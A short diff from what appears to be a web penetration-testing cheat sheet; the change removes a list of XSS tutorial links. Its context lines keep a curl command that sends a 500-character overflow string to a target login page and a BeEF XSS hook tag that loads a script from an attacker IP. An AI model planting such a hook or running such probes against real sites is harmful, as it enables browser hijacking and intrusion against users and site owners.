@@ -234,14 +234,6 @@ curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
 # BeEF              <script> src = "http://<attacker IP>:3000/hook.js"></script>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Additional Guides
-
-http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
-http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
-https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
-https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Example Assessment
 
 - Initial recon
